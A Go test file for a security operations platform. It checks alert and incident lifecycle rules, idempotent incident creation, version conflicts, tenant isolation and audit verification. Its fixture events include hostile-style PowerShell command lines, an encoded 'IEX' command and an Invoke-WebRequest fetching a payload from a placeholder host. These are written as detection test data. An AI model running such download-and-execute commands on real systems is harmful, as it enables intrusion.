package soc

import (
	"context"
	"errors"
	"testing"

	"github.com/kcsp/platform/internal/core"
	"github.com/kcsp/platform/internal/pipeline"
	"github.com/kcsp/platform/internal/store"
)

func TestIncidentLifecycleAndIdempotentCreation(t *testing.T) {
	memory := store.NewMemory()
	engine := pipeline.New(memory)
	service := New(memory)
	result, err := engine.Ingest(context.Background(), "tenant-a", core.CanonicalEvent{
		ID: "evt-1", Category: "process_activity", Source: core.EventSource{Vendor: "Microsoft", Product: "Sysmon", Type: "endpoint"},
		User: core.UserRef{Name: "admin", IsPrivileged: true}, Device: core.DeviceRef{Hostname: "dc-01", Criticality: 5},
		Process: core.ProcessRef{Name: "powershell.exe", CommandLine: "powershell.exe -EncodedCommand SQBFAFgA"},
	})
	if err != nil {
		t.Fatal(err)
	}
	input := CreateIncidentInput{AlertIDs: []string{result.Alerts[0].ID}, Title: "Investigate PowerShell", Assignee: "analyst"}
	incident, duplicate, err := service.CreateIncident("tenant-a", "analyst", input)
	if err != nil || duplicate {
		t.Fatalf("create incident: duplicate=%v err=%v", duplicate, err)
	}
	second, duplicate, err := service.CreateIncident("tenant-a", "analyst", input)
	if err != nil || !duplicate || second.ID != incident.ID {
		t.Fatalf("idempotent creation failed: duplicate=%v err=%v", duplicate, err)
	}
	if _, err := service.UpdateIncident("tenant-a", incident.ID, "analyst", IncidentPatch{Status: "CONTAINMENT", Version: incident.Version}); !errors.Is(err, ErrInvalidTransition) {
		t.Fatalf("expected invalid transition, got %v", err)
	}
	incident, err = service.UpdateIncident("tenant-a", incident.ID, "analyst", IncidentPatch{Status: "TRIAGE", Version: incident.Version})
	if err != nil {
		t.Fatal(err)
	}
	if incident.Status != "TRIAGE" || len(incident.AllowedTransitions) == 0 {
		t.Fatalf("unexpected incident state: %+v", incident)
	}
	if _, err := service.UpdateIncident("tenant-a", incident.ID, "analyst", IncidentPatch{Status: "CLOSED", Version: incident.Version}); !errors.Is(err, ErrClosureDetails) {
		t.Fatalf("closing without disposition/reason should fail, got %v", err)
	}
	if !memory.VerifyAudit("tenant-a") {
		t.Fatal("audit chain should verify after SOC mutations")
	}
}

func TestCrossTenantAlertCannotBeEscalated(t *testing.T) {
	memory := store.NewMemory()
	engine := pipeline.New(memory)
	service := New(memory)
	result, err := engine.Ingest(context.Background(), "tenant-a", core.CanonicalEvent{
		ID: "evt-a", Category: "process_activity", Source: core.EventSource{Vendor: "Microsoft", Product: "Sysmon", Type: "endpoint"},
		Process: core.ProcessRef{Name: "powershell.exe", CommandLine: "Invoke-WebRequest https://example.invalid"},
	})
	if err != nil {
		t.Fatal(err)
	}
	_, _, err = service.CreateIncident("tenant-b", "attacker", CreateIncidentInput{AlertIDs: []string{result.Alerts[0].ID}})
	if !errors.Is(err, store.ErrNotFound) {
		t.Fatalf("expected tenant-scoped not found, got %v", err)
	}
}

func TestAlertTriageClosureAndOptimisticVersion(t *testing.T) {
	memory := store.NewMemory()
	engine := pipeline.New(memory)
	service := New(memory)
	result, err := engine.Ingest(context.Background(), "tenant-a", core.CanonicalEvent{
		ID: "evt-triage", Category: "process_activity", Source: core.EventSource{Vendor: "Microsoft", Product: "Sysmon", Type: "endpoint"},
		Process: core.ProcessRef{Name: "powershell.exe", CommandLine: "powershell.exe -EncodedCommand SQBFAFgA"},
	})
	if err != nil {
		t.Fatal(err)
	}
	alert := result.Alerts[0]
	alert, err = service.UpdateAlert("tenant-a", alert.ID, "analyst", "req-1", AlertPatch{
		Status: "ACKNOWLEDGED", Assignee: "analyst", Comment: "Telemetry checked", Version: alert.Version,
	})
	if err != nil {
		t.Fatal(err)
	}
	if alert.Status != "ACKNOWLEDGED" || alert.Assignee != "analyst" || alert.SLA.Acknowledged == nil {
		t.Fatalf("unexpected acknowledged alert: %+v", alert)
	}
	if _, err := service.UpdateAlert("tenant-a", alert.ID, "analyst", "req-stale", AlertPatch{Status: "IN_PROGRESS", Version: 1}); !errors.Is(err, store.ErrVersionConflict) {
		t.Fatalf("expected stale version conflict, got %v", err)
	}
	if _, err := service.UpdateAlert("tenant-a", alert.ID, "analyst", "req-close", AlertPatch{Status: "CLOSED", Version: alert.Version}); !errors.Is(err, ErrClosureDetails) {
		t.Fatalf("expected disposition requirement, got %v", err)
	}
	alert, err = service.UpdateAlert("tenant-a", alert.ID, "analyst", "req-close", AlertPatch{
		Status: "CLOSED", Disposition: "FALSE_POSITIVE", Comment: "Approved test activity", Version: alert.Version,
	})
	if err != nil {
		t.Fatal(err)
	}
	if alert.Status != "CLOSED" || alert.Disposition != "FALSE_POSITIVE" {
		t.Fatalf("unexpected closed alert: %+v", alert)
	}
	if _, err := service.UpdateAlert("tenant-a", alert.ID, "analyst", "req-reopen", AlertPatch{Status: "IN_PROGRESS", Version: alert.Version}); !errors.Is(err, ErrInvalidTransition) {
		t.Fatalf("closed alert reopened: %v", err)
	}
}

func TestFullIncidentLifecycleRequiresClosureConclusion(t *testing.T) {
	memory := store.NewMemory()
	engine := pipeline.New(memory)
	service := New(memory)
	result, err := engine.Ingest(context.Background(), "tenant-a", core.CanonicalEvent{
		ID: "evt-lifecycle", Category: "process_activity", Source: core.EventSource{Vendor: "Microsoft", Product: "Sysmon", Type: "endpoint"},
		Device:  core.DeviceRef{Hostname: "server-01", Criticality: 5},
		Process: core.ProcessRef{Name: "powershell.exe", CommandLine: "Invoke-WebRequest https://example.invalid/payload"},
	})
	if err != nil {
		t.Fatal(err)
	}
	incident, _, err := service.CreateIncident("tenant-a", "analyst", CreateIncidentInput{AlertIDs: []string{result.Alerts[0].ID}})
	if err != nil {
		t.Fatal(err)
	}
	for _, state := range []string{"TRIAGE", "INVESTIGATION", "CONTAINMENT", "ERADICATION", "RECOVERY"} {
		incident, err = service.UpdateIncident("tenant-a", incident.ID, "analyst", IncidentPatch{Status: state, Version: incident.Version})
		if err != nil {
			t.Fatalf("transition to %s: %v", state, err)
		}
	}
	incident, err = service.UpdateIncident("tenant-a", incident.ID, "analyst", IncidentPatch{
		Status: "CLOSED", Disposition: "BENIGN_TRUE_POSITIVE", ClosureReason: "Synthetic lifecycle verified", Comment: "Recovery complete", Version: incident.Version,
	})
	if err != nil {
		t.Fatal(err)
	}
	if incident.Status != "CLOSED" || incident.ClosureReason == "" || len(incident.AllowedTransitions) != 0 {
		t.Fatalf("unexpected closure: %+v", incident)
	}
	if len(incident.Timeline) < 8 {
		t.Fatalf("expected lifecycle timeline, got %d entries", len(incident.Timeline))
	}
}
